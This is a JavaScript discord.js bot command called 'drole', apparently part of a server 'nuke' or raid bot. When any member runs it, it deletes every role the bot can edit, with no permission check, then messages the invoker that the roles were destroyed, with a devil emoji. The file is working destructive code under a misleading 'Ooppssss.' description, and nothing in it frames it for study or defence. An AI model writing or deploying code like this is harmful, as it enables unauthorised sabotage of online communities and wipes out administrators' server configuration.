const { SlashCommandBuilder } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('drole')
        .setDescription('Ooppssss.'),

    async execute(interaction) {
        try {
            const roles = await interaction.guild.roles.fetch();
            const member = interaction.user

            for (const [roleId, role] of roles) {
                if (role.editable && !role.managed && role.id !== interaction.guild.id) {
                    try {
                        await role.delete();
                    } catch (error) {
                        console.error(`Failed to delete role ${role.name}: ${error}`);
                    }
                }
            }

            member.send(`All deletable roles **[${roles.size}]** has been deleted 😈 `);
        } catch (error) {
            console.error(`Error fetching roles: ${error}`);
            console.log('There was an error trying to delete all roles.');
        }
    }
};
